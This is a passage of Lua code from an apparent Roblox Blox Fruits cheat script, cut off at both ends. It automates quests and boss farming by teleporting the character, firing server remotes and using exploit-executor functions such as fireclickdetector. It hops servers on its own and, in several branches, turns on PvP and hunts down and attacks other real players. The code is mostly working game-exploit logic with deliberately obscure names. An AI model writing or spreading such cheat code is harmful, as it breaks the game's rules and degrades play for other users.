                     local terungungungungungungu = getMobPirateRaid()
                     set("Pirate Raid")
                     repeat wait()
                        pcall(function ()
                        to(getKillVector3(terungungungungungungu.HumanoidRootPart.CFrame))
                        stuff ()
                        click = true
                        end)
                     until not skidymf(terungungungungungungu)
                     click = false
                  until checkNotify"job" or os.time()-check180 > 200
                   
                  elseif   CheckSea(3) and hakicol  then
                    
                     if game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible  then
                       if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Stone")  then
                        if not CheckBoss"Stone"  then
                           HopServer() wait(9999)
                        end

                        local bulon = CheckBoss"Stone"
                        repeat wait()
                           pcall(function ()
                           to(getKillVector3(bulon.HumanoidRootPart.CFrame))
                           click= true
                           stuff ()
                           end)
                        until not skidymf(bulon)
                        click = false
                     end
                     if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Empress")  then
                        if not CheckBoss"Island Empress"  then
                           HopServer() wait(9999)
                        end
                        eltrulngu = CheckBoss"Island Empress"
                        repeat wait()
                           pcall(function ()
                           to(getKillVector3(eltrulngu.HumanoidRootPart.CFrame))
                           click= true
                           stuff ()
                           end)
                        until not skidymf(eltrulngu)
                        click = false
                     end
                     if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Kilo")  then
                        if not CheckBoss"Kilo Admiral"  then
                           HopServer() wait(9999)
                        end
                        eltrulngu = CheckBoss"Kilo Admiral"
                        repeat wait()
                           pcall(function ()
                           to(getKillVector3(eltrulngu.HumanoidRootPart.CFrame))
                           click= true
                           stuff ()
                           end)
                        until not skidymf(eltrulngu)
                        click = false
                     end
                     if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Elephant")  then
                        if not CheckBoss"Captain Elephant"  then
                           HopServer() wait(9999)
                        end
                        eltrulngu = CheckBoss"Captain Elephant"
                        repeat wait()
                           pcall(function ()
                           to(getKillVector3(eltrulngu.HumanoidRootPart.CFrame))
                           click= true
                           stuff ()
                           end)
                        until not skidymf(eltrulngu)
                        click = false
                     end
                     if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Beautiful")  then
                        if not CheckBoss"Beautiful Pirate"  then
                          noti"Hop For Beautiful Pirate"
                           HopServer() wait(9999)
                        end
                        eltrulngu = CheckBoss"Beautiful Pirate" 
                   
                        repeat wait()
                           pcall(function ()
                           to(getKillVector3(eltrulngu.HumanoidRootPart.CFrame))
                           click= true
                           stuff ()
                           end)
                        until not skidymf(eltrulngu)
                        click = false
                     end
                     else
                       game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("HornedMan","Bet")
                     end 
                
                  elseif CheckSea(3) and cls_5 then
                     eltrulngungungu = getElite()
                     
                     if eltrulngungungu  then
                        if game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible  then

                           if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,
                           eltrulngungungu.Name:gsub(" %pLv. %d+%p", ""))   then
                              
                              repeat wait()
                                 pcall(function()
                                 to(getKillVector3( eltrulngungungu.HumanoidRootPart.CFrame))
                                 click = true
                                 stuff(eltrulngungungu)
                                 end)
                              until not skidymf(eltrulngungungu)
                              click = false
                           else
                           
                              game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                            
                           end

                        else
                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter")
                        end
                     end
                  elseif  CheckSea(3) and Canvanderreq  then
                     local ter = CheckBoss"Beautiful Pirate"
                     set("Farming "..ter.Name.." [Canvander]")
                     repeat wait()
                        pcall(function ()
                        to(getKillVector3(ter.HumanoidRootPart.CFrame))
                        click = true
                        stuff(ter)
                        end)
                     until not skidymf(ter)
          
               elseif  cls_4  then
                  
                  set"Doing Bartilo Quest"
                  if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress","Bartilo" ) == 0  then
                     if game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible == true  then

                        if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Swan") and string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "50")  then
                        
                           pcall(function ()to(getMobLoadPos("Swan Pirate")*CFrame.new(0,50,5))end)
                           for i, v in pairs(getsortedmon()) do
                              if v.Name == "Swan Pirate"  then
                                 repeat wait()
                                    pcall(function ()
                                    to(getKillVector3(v.HumanoidRootPart.CFrame))
                                    stuff(v)
                                    BringMobChoosen = v
                                    BringMob(v)
                                    click = true
                                    end)
                                 until not skidymf(v)
                                 click = false
                              end
                           end
                        else
                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                          
                        end
                     else
                        local args = {[1] = "StartQuest", [2] = "BartiloQuest", [3] = 1}

                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                     end
                  elseif  BartiloProgress == 1  then
                     
                     local v84 = CheckBoss("Jeremy")


                     if v84  then


                        repeat wait()
                           pcall(function ()
                           to(getKillVector3(v84.HumanoidRootPart.CFrame))
                           stuff(v84)
                           click = true
                           end)
                        until not skidymf(v84)
                        click = false
                     end
                  elseif   game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress","Bartilo" ) == 2  then
                     set("Doing Bartilo Quest 3: (sugget this quest name plz)")
                     if (CFrame.new(-1837.46155,44.2921753,1656.1987,0.999881566,-1.03885048e-22,-0.0153914848,1.07805858e-22,1,2.53909284e-22,0.0153914848,-2.55538502e-22,0.999881566).Position-game.Players.LocalPlayer.Character.Head.Position).magnitude > 500  then
                        to(CFrame.new(-1837.46155,44.2921753,1656.1987,0.999881566,-1.03885048e-22,-0.0153914848,1.07805858e-22,1,2.53909284e-22,0.0153914848,-2.55538502e-22,0.999881566))
                     else


                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =

                        CFrame.new(-1836, 11, 1714)
                        wait(.5)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1850.49329, 13.1789551, 1750.89685)
                        wait(1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1858.87305, 19.3777466, 1712.01807)
                        wait(1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1803.94324, 16.5789185, 1750.89685)
                        wait(1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1858.55835, 16.8604317, 1724.79541)
                        wait(1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1869.54224, 15.987854, 1681.00659)
                        wait(1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1800.0979, 16.4978027, 1684.52368)
                        wait(1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1819.26343, 14.795166, 1717.90625)
                        wait(1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1813.51843, 14.8604736, 1724.79541)
                     end



                  end
                  
              elseif   CheckSea(3) and CheckMaterialCount("Conjured Cocoa") < 10 and not checkitem"Sweet Chalice" and not checkitem"Mirror Fractal"  then
                  local vinhbeo = {"Chocolate Bar Battler","Cocoa Warrior"}
        
                  for vdjsbxhw, fjwjsnnd in pairs(vinhbeo) do
                     if not getmon(fjwjsnnd)  then
                        pcall(function () to(getMobLoadPos(fjwjsnnd:gsub(" %pLv. %d+%p", ""))*CFrame.new(0,80,0)) end)
                     else
                        for bu, lon in pairs(getsortedmon()) do
                           if lon.Name == fjwjsnnd  then
                            
                                 
                                 
                                 click = true
                                   BringMob(lon)
                              repeat wait()
                                 pcall(function()
                                 to(getKillVector3(lon.HumanoidRootPart.CFrame))
                                 stuff ()
                                 end)
                              until not skidymf(lon)
                           end
                        end
                     end
                  end
        
               elseif   CheckSea(2) and factoryexists  then
                  
                  set"Attempt To Farming Factory"
                  local v72 = getmon"Core" or CheckBoss"Core"
                  if v72  then
                     repeat wait()
                        pcall(function ()
                        to(v72.HumanoidRootPart.CFrame)
                        click= true
                        stuff(v72)

                        end)

                     until not skidymf(v72)
                     factoryexists = false
                  end
                  storefruit()
               elseif  CheckSea(2) and rengokustat  then
                  
                  to(CFrame.new(6571.1201171875, 299.23028564453, -6967.841796875))
                  EquipWeaponName"Hidden Key"
               elseif  CheckSea(2) and librarydoor  then
                  
                  to(CFrame.new(6376.93164, 296.760071, -6843.54932, -0.906182051, -1.26464874e-08, -0.422887832, -7.46116324e-09, 1, -1.39169662e-08, 0.422887832, -9.45606971e-09, -0.906182051))
               elseif  CheckSea(2) and not cls_7 and checkitem"Water Key"   then
                  set"Using Water Key For Daigrock"
                  buyMelee"SharkmanKarate"
                  -- elseif  print"ok27" and CheckSea(2) and ((checkitem("Hidden Key")and not checkitem"Rengoku") or (checkitem("Library Key") and game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor:FindFirstChild"PhoeyuDoor" and game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor.PhoeyuDoor.Transparency == 0 ) or (checkitem"Water Key"and not cls_7 ))  then
                  --       print"key"
                  --       if checkitem("Library key")  then
                  --         to(CFrame.new(6376.93164, 296.760071, -6843.54932, -0.906182051, -1.26464874e-08, -0.422887832, -7.46116324e-09, 1, -1.39169662e-08, 0.422887832, -9.45606971e-09, -0.906182051))
                  --         if (CFrame.new(6376.93164, 296.760071, -6843.54932, -0.906182051, -1.26464874e-08, -0.422887832, -7.46116324e-09, 1, -1.39169662e-08, 0.422887832, -9.45606971e-09, -0.906182051).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3  then
                  --                                 wait(1.2)
                  --                                 game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep",true)
                  --                                 game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
                  --                                 wait(0.5)
                  --         end
                  --                           elseif  checkitem("Hidden Key")  then
                  --        to(CFrame.new(6571.1201171875, 299.23028564453, -6967.841796875))
                  --       EquipWeaponName"Hidden Key"
                  --                           elseif  checkitem"Water Key"  then
                  --              buyMelee"SharkmanKarate"
                  --       end
               
                 
elseif CheckSea(3) and c().Main['Soul Guitar'] and not checkitem"Soul Guitar" and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")  == nil and game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149431" then

  if  game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")  == nil then
						game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("gravestoneEvent", 2)

						game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("gravestoneEvent", 2, true)
  end

elseif CheckSea(3) and c().Main['Soul Guitar'] and type(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")) == "table" then 
  for _a_a_a_a, _a_a_a_b in pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")) do 
    if _a_a_a_b == false then
      if _a_a_a_a == "Swamp" then
      set("Soul Guitar 2nd Quest [Swamp]")
          _a_a_a_c = 
          {
            "Living Zombie", 
            "Living Zombie"
          }
          to(getMobLoadPos(_a_a_a_c[2])) 
          for ______a, ______b in pairs(getsortedmon()) do 
            if ______b.Name == _a_a_a_c[1] then 
              while skidymf(______b) do
                BringMob(______b)
                click = true 
                to(______b.HumanoidRootPart.CFrame*CFrame.new(0,35,0))
              end 
            end 
          end
      elseif _a_a_a_a == "Gravestones" then 
         set("Soul Guitar 3rd Quest [Gravestones]")
            	_____temp = {
										  Placard7 = "Left",
										  Placard6 = "Left",
										  Placard5 = "Left",
										  Placard4 = "Right",
										  Placard3 = "Left",
										  Placard2 = "Right",
										  Placard1 = "Right",
										}
										
										for _a_a_a_d, _a_a_a_e in pairs(_____temp) do
										  fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"][_a_a_a_d][_a_a_a_e].ClickDetector)
										  task.wait(.2)
										end
      elseif _a_a_a_a == "Ghost" then 
         
  			   game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Ghost")
  			   game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Ghost", true)
         elseif _a_a_a_a == "Trophies" then 
          
    	     for _a_a_a_f, _a_a_a_g in pairs(game:GetService("Workspace").Map["Haunted Castle"].Tablet: GetChildren()) do 
    	       if _a_a_a_g:FindFirstChild"ClickDetector" and _a_a_a_g.Line.p.Y < -999 then 
    	         fireclickdetector(_a_a_a_g.ClickDetector)
    	         task.wait(.2)
    	         end 
    	     end
        end
    end 
  end 


               elseif  CheckSea(2) and rengokustat3  then
               
                  local ayumimimimi = CheckBoss"Awakened Ice Admiral"
                  repeat wait()
                print (0)
                to(getKillVector3(ayumimimimi))
                print (1)
                     click = true
                     stuff(ayumimimimi)
                     
                  until not skidymf(ayumimimimi.HumanoidRootPart.CFrame)
               elseif  CheckSea(2)  and waterkeystuff   then
                  local ayumimimimi = CheckBoss"Tide Keeper"
                
                  repeat wait()
                  warn(0)
                     to(getKillVector3(ayumimimimi.HumanoidRootPart.CFrame))
                     click = true
                     stuff(ayumimimimi)
                 
                  until not skidymf(ayumimimimi.HumanoidRootPart.CFrame)
                  if not checkitem"Water Key" and getPlayerLevel() > 1500  then
                    noti"Hop For Water Key"
                     HopServer() wait(9999)
                  end
               elseif  CheckSea(1) and getPlayerLevel() > 200 and not checkitem("Saber") and game:GetService("Workspace").Map.Jungle.Final.Part.CanCollide and c().Main["Item / Saber"]  then
                  
               
                  if game:GetService("Workspace").Map.Jungle.QuestPlates.Door.CanCollide  then
                  
                     for r, v in next, game:GetService("Workspace").Map.Jungle.QuestPlates:GetChildren() do

                        if v:IsA("Model")  then

                           if v.Button:FindFirstChild("TouchInterest") then
                              pcall(function ()
                                wait(1)
                              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Button.CFrame
                              end)
                           end
                        end
                     end


                  elseif   game:GetService("Workspace").Map.Desert.Burn.Part.Transparency == 0  then
                     
                     if not checkitem("Torch")  then
                        to(game:GetService("Workspace").Map.Jungle.Torch.CFrame)
                     else
                       repeat wait()
                        EquipWeaponName("Torch")
                        workspace.CurrentCamera.CFrame = CFrame.new(1114.61475, 5.04679728, 4350.22803, -0.648466587, -1.28799094e-09, 0.761243105, -5.70652914e-10, 1, 1.20584542e-09, -0.761243105, 3.47544882e-10, -0.648466587)
                        to(CFrame.new(1114.61475, 5.04679728, 4350.22803, -0.648466587, -1.28799094e-09, 0.761243105, -5.70652914e-10, 1, 1.20584542e-09, -0.761243105, 3.47544882e-10, -0.648466587))
                        until not checkitem"Torch"
                     end


                  elseif  game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","SickMan") ~= 0  then
                     
                     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","GetCup")
                     EquipWeaponName("Cup")
                     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","FillCup",game:GetService("Players").LocalPlayer.Character.Cup)
                     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","SickMan")


                  elseif   game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon") == nil  then
                     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon")


                  elseif  game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon") == 0 and not checkitem"Relic"  then
                     repeat wait()
                        local v68 = CheckBoss("Mob Leader")
                        if v68  then
                           repeat wait()
                        
                              to(v68.HumanoidRootPart.CFrame*CFrame.new(0,35,5))
                              click = true
                              stuff(v68)
                       
                           until not skidymf(v68)
                           click = false
                        end
                     until game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon") == 1 or checkitem"Relic"
                     

                  elseif   game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon") == 1 and game:GetService("Workspace").Map.Jungle.Final.Part.CanCollide   then
                    
                     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon")
                     EquipWeaponName("Relic")
                   repeat wait()
                     to(CFrame.new(-1404.91504, 29.9773273, 3.80598116, 0.876514494, 5.66906877e-09, 0.481375456, 2.53851997e-08, 1, -5.79995607e-08, -0.481375456, 6.30572643e-08, 0.876514494))
                     workspace.CurrentCamera.CFrame =GetService("Workspace").Map.Jungle.Final.Part.CFrame
                      until not game:GetService("Workspace").Map.Jungle.Final.Part.CanCollide or not checkitem"Relic"
                  end
               elseif  CheckSea(1) and CheckBoss("Saber Expert") and getPlayerLevel() > 199 and not checkitem("Saber") and not game:GetService("Workspace").Map.Jungle.Final.Part.CanCollide  then
             
                 
                  local v60 = CheckBoss("Saber Expert")
                  
                  if v60  then
                     repeat wait()
                
                        to(getKillVector3(v60.HumanoidRootPart.CFrame))
                        stuff(v60)
                        click = true
                   
                     until not skidymf(v60)
                     click= false
                  end


               elseif  CheckSea(1) and getPlayerLevel() > 700 and game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") ~=
                  0  then
                     
                     if not checkitem("Saber") and not CheckBoss("Saber Expert")  then
                        set("Hop For Reason: Missing Saber, Hopping For Requirements")
                        HopServer() wait(9999)
                        return
                     end
                     

                     if game.Workspace.Map.Ice.Door.CanCollide  then
                        if

                        not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Key") and

                        not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Key")
                         then
                           if
                           (CFrame.new(4852.2895507813, 5.651451587677, 718.53070068359).Position -
                           game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).magnitude < 5
                            then
                              game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("DressrosaQuestProgress", "Detective")
                              EquipWeaponName("Key")
                           else
                              to(CFrame.new(4852.2895507813, 5.651451587677, 718.53070068359), false)
                           end
                        else
                           EquipWeaponName("Key")
                           if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Key")  then
                              to(game.Workspace.Map.Ice.Door.CFrame)
                           end
                        end


                     elseif  not game.Workspace.Map.Ice.Door.CanCollide  then
                        local v67 = CheckBoss("Ice Admiral") if v67  then
                           repeat wait()
                            
                              to(getKillVector3(v67.HumanoidRootPart.CFrame))
                              stuff(v67)

                              click = true
                        
                           until not skidymf(v67)

                           click = false
                           repeat wait() until not TeleportSea(2)
                           end
                        end
 
                     elseif   CheckSea(1) and getPlayerLevel() < 700 and getPlayerLevel() > 60 and game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("PlayerHunter")  ~=  "I don't have anything for you right now. Come back later." and c().Main["Fast Method"]  then
                        if not dimemi  then grhsksjehjrjdjdjsks = os.time() end
                        dimemi = true
                      
                        st = 1
                        local v6 = game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("PlayerHunter")
                        if v6 ~= "I don't have anything for you right now. Come back later."  then
                           if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible  then
                              local dicac2 = string.gsub(string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Defeat ", ""), " %p(0/1)%p", "")
                              dicac = game.Players[dicac2]

                              if dicac and not blocked[dicac.Name]  then

                                 if dicac:FindFirstChild"Data" and dicac.Data.Level.Value > 20 and dicac.Character.Humanoid.MaxHealth < (game.Players.LocalPlayer.Character.Humanoid.Health + (getPlayerLevel()*1.4)*2) then
                                    dimemi = false

                                    starttime = os.time()
                                    iseltrulcool = false
                                    repeat game:GetService"RunService".Stepped:Wait() 
                                      pcall(function ()
                                --       jrjdbdhdjks, eieiksghrjdks = pcall(function()
                                    dmlockskill = dicac.Character.Head.Position
                                         stuff()
                                       if game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible  then
repeat wait (1)
                                          game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EnablePvp")

                                          starttime = starttime + 1 until not game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible or starttime > 50
                                          end

                                          to(dicac.Character.HumanoidRootPart.CFrame+(alskdbwbhsh or Vector3.new(0,0,0)))
                                       --    if game.Players.LocalPlayer.PlayerGui.Main.Skills[NameMelee()].Z.Cooldown.AbsoluteSize.X < 5 or game.Players.LocalPlayer.PlayerGui.Main.Skills[NameMelee()].X.Cooldown.AbsoluteSize.X < 5  then
--                                              alskdbwbhsh = Vector3.new(0,0,0) 
--                                           else
--                                              alskdbwbhsh = Vector3.new(math.random(-4, 4),math.random(-4, 4),math.random(-4, 4))
--                                            
--                                            tls = os.time()
--                                              
--                                              
--                                              
--                                           end
                                          spawn(function ()
                                          if lp:DistanceFromCharacter(dicac.Character.HumanoidRootPart.Position) < 10  then
                                             iseltrulcool = true
                                             down"Z" down"X"
                                          else
                                             if not iseltrulcool  then
                                                starttime = os.time()
                                             end
                                          end 
                                          end)
                                        end)
                                       until  not dicac.Character:FindFirstChild"Head" or  os.time()-starttime > 30 or not game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible or game.Players.LocalPlayer.PlayerGui.Main.SafeZone.Visible
dmlockskill = false
                                       blocked[dicac.Name] = true
                                       
                                    else
                                       blocked[dicac.Name..tostring(math.random(83848,27277282727278485))] = true

                                   
                                    end
                                
                                 end

                           end 
                        end 
                          
                       if  dimemi and (os.time()-grhsksjehjrjdjdjsks) > 3  then 
                 
                           HopServer()
                           return 
                           end
                              elseif (CheckSea(2) and c().Main["Quest / Race V3"] and getPlayerBeli() > 2000000 and not moctui(3) and table.find(backi, whatismyrace())  and ( (whatismyrace() == "Human" and (not pork or throughcheck(pork, 0, CheckBoss))))) and uable["FlamingoAccess"]then 
                        
                         
                             local wtf = whatismyrace()  
                             sh() 
                             if wtf == "Human" then 
                
                               pork = {
                                   ["Fajita"] = false,
                                   ["Jeremy"] = false,
                                   ["Diamond"] = false 
                                   
                                 } 
                                 for i, v in pairs(pork) do 
                             
                                   if v == false and CheckBoss(i) then 
                           
                                     inside = CheckBoss(i)
                                     repeat task.wait() 
                                 
                                       to(getKillVector3(inside.HumanoidRootPart.CFrame)) 
                                       stuff(inside)
                                       click = true 
                                      
                                     until not skidymf(inside) 
                                     click = false 
                                  
                             
                                       pork[i] = true 
                                      -- glgsshjdjrj = (glgsshjdjrj or 0  ) +1
                                       
                                 
                                         
                                         UpV3()
                                         
                                       
                                   else 
                                     noti("Waiting For Boss: "..tostring(i))
                           
                                   end
                                 end
                                 
                                 
                             elseif wtf == "Angel" then 
                               sh()
                               local skidderso1vn = luoiquanenskidxdxdxd() 
                               if not skidderso1vn or #skidderso1vn < 1 then 
                                 HopServer() 
                               end 
                               for snack, potato in pairs(skidderso1vn) do 
                                   repeat game:GetService"RunService".Stepped:Wait()
                                       jrjdbdhdjks, eieiksghrjdks = pcall(function()
                                         
                                    dmlockskill = potato.Character.Head.Position
                                         stuff()
                                       if game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible  then
repeat wait ()
                                          game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EnablePvp")

                                          starttime = starttime + 1 until not game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible
                                          end

                                          to(potato.Character.HumanoidRootPart.CFrame+(alskdbwbhsh or Vector3.new(0,0,0)))
                                          if game.Players.LocalPlayer.PlayerGui.Main.Skills[NameMelee()].Z.Cooldown.AbsoluteSize.X > 5 
                                         then 
                                           alskdbwbhsh = Vector3.new(0,40,0)
                                           else
                                             alskdbwbhsh = Vector3.new(0,0,0) 
                                         repeat wait() until not game.Players.LocalPlayer.Character.Busy.Value
                                        wait(.1)     
                                             
                                             
                                          end
                                         
                                         
                                        
                                          if game.Players.LocalPlayer.PlayerGui.Main.Skills[NameMelee()].X.Cooldown.AbsoluteSize.X > 5  then
                                             alskdbwbhsh = Vector3.new(0,40,0)
                                          else
                                             alskdbwbhsh = Vector3.new(0,0,0) 
                                           
                                           
                                             repeat wait() until not game.Players.LocalPlayer.Character.Busy.Value
                                        wait(.1)     
                                             
                                             
                                          end
                                          
                                          if lp:DistanceFromCharacter(potato.Character.HumanoidRootPart.Position) < 10  then
                                             hirimiihubontopxd = true
                                             down"Z" down"X"
                                          else
                                             if not hirimiihubontopxd  then
                                                starttime = os.time()
                                             end
                                          end

                                      
                                       end)
                                        
                                   until not potato or not potato.Character or not potato.Character:FindFirstChild"Humanoid" or not potato.Character:FindFirstChild"Head" or not skidymf(potato.Character) or  os.time()-starttime > 150 or game.Players.LocalPlayer.PlayerGui.Main.SafeZone.Visible or checkNotify"player" or moctui(3)
                                     dmlockskill = false
                                 end
                             elseif wtf == "Rabbit" then 
                               for i, v in pairs(game.Workspace:GetChildren()) do 
                                 pcall(function ()
                                   to(v.CFrame)
                                 end) 
                                 sh()
                                 if moctui(3) then break end 
                                 end
                             end
                       if  dimemi and (os.time()-grhsksjehjrjdjdjsks) > 3  then 
                
                           HopServer()
                           return 
                           end
                        elseif  fruitspawn() and c().Fruit["Misc / Fruit Looting"] and not CheckIsRaiding()  then 
                         
                           set("SpawnFruit Tweening")
                           fw = fruitspawn()
                          
                     
                              game.Players.LocalPlayer.Character.Humanoid:MoveTo(fw.Handle.CFrame.p)
                              to(fw.Handle.CFrame)
                        elseif   CheckSea(2) and getPlayerLevel() > 1500 == nil and get1mfruit() == false and not AutoRaid and not CheckIsRaiding() and c().Main["Misc / Hop To Another For 1m+ Fruit (Swan Quest)"] and (os.time()- timelol) > c().Main["Misc / Delay For Hopping"]  then

                           set("Hopping For Reason: Missing 1M+ Fruit, Hop")
                           wait(2)
                           if not not AutoRaid and not CheckIsRaiding()  then
                              HopServer() wait(9999)
                           end
                           HopServer() wait(9999)
                        elseif CheckSea(2) and getPlayerLevel() > 1100  and get1mfruit() then
                   
                        
                           set"Give 1M+ Devil Fruit For Trevor [Swan Quests]"
                           loadfruit(get1mfruit())


                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor","1")
                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor","2")
                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor","3")

                        elseif   CheckSea(2) and getPlayerLevel() > 1100  and CheckBoss"Don Swan" and zqp  == nil  then
                      
                           local v54 = CheckBoss"Don Swan"
                           if v54  then
                              repeat wait()
                              
                                 to(getKillVector3(v54.HumanoidRootPart.CFrame))
                                 click = true
                                 stuff ()
                             
                              until not skidymf(v54) or not CheckIsRaiding() or not AutoRaid
                              click = false
                           end
                        elseif  CheckSea(2) and getPlayerLevel() > 1500 and zqp == 0 and cls_7  then
                           game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("ZQuestProgress","Check")
                           game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("ZQuestProgress","Begin")

                           v53 = CheckBoss("rip_indra")
                           if v53  then
                              repeat wait()
                      
                                 to(getKillVector3(v53.HumanoidRootPart.CFrame)) click = true
                                 stuff ()
                             
                          
                              until not skidymf(v53)
                              click = false
                           end

                          
                           elseif  CheckSea(1) and getPlayerLevel() <= 60  then

                              st = 2
                              Mob = "Shanda"
                              Mob2 = "Shanda"
                              pcall(function ()
                                
                              to(getMobLoadPos(Mob)+Vector3.new(0,50,0))
                              end)
                              
                              for i, v in pairs(getsortedmon()) do
                                 if v.Name == Mob2  then
                                   
                                    repeat task.wait()
                                    stuff(v)
                                       BringMob(v)
                                    
                                       to(getKillVector3(v.HumanoidRootPart.CFrame))
                                      
                                       click = true
                                       
                                    until not skidymf(v) or st ~= 2
                                    click= false
                                 
                                    click = false
                                 end
                              end 
                        
                           elseif  CheckSea(2)  and BartiloProgress == 3 and c().Main["Quest / Race V2"] and  getPlayerBeli() > 700000 and not
                             
                             
                             moctui(2) and ((game.Workspace:FindFirstChild"Flower1" and workspace.Flower1.Transparency ~= 1) or checkitem"Flower 1") and not checkitem"Flower 3"  then
                              set"Auto Doing Evolution Quest [Race V2]"
                              game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "1")
                              game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "2")
                              pcall(function ()
                              if not checkitem"Flower 1"  then
                                 to(Workspace.Flower1.CFrame)


                              elseif  cls_6  then
                                 pcall(function ()

                                 to(Workspace.Flower2.CFrame)
                                 end)

                              elseif  not checkitem"Flower 3"  then
                                 pcall(function () to(getMobLoadPos"Swan Pirate"*CFrame.new(math.random(0,50),math.random(0,80),math.random(0,50)))end)
                                 for dk, fj in pairs(getsortedmon()) do
                                    if fj and fj.Name == "Swan Pirate"  then
                                       repeat wait()
                                      
                                          to(getKillVector3(fj.HumanoidRootPart.CFrame))
                                          click= true
                                          stuff(fj)
                                          BringMobChoosen = fj
                                          BringMob(fj)
                                         
                                       until not skidymf(fj) or checkitem"Flower 3"
                                       click = false 
                                       wait(.3)
                                      
                                    end
                                 end

                              end
                              end) 
                              
                              
                          
